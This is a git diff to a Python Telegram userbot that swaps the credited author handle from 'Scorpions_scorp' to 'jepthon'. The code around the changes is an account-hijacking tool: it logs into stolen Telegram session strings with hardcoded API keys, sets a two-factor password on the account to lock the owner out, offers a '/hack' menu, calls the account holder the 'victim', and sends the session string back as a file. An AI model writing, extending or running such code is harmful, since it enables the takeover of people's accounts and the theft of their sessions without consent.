@@ -1,5 +1,6 @@
 
 from JoKeRUB import bot, l313l
+#By Source joker @jepthon
 from telethon import events, functions, types, Button
 from datetime import timedelta
 from JoKeRUB.utils import admin_cmd
@@ -79,7 +80,7 @@ async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     try:
-      await X.edit_2fa('Scorpions_scorp')
+      await X.edit_2fa('jepthon')
       return True
     except:
       return False
@@ -159,7 +160,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "Scorpions_scorp"
+channel = "jepthon"
 menu = '''
 
 "A" :~ [معرفه قنوات/كروبات التي يملكها]
@@ -293,7 +294,7 @@ async def users(event):
         return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @Scorpions_scorp")
+        file.write(i + "\n\nDetails BY @Jepthon")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
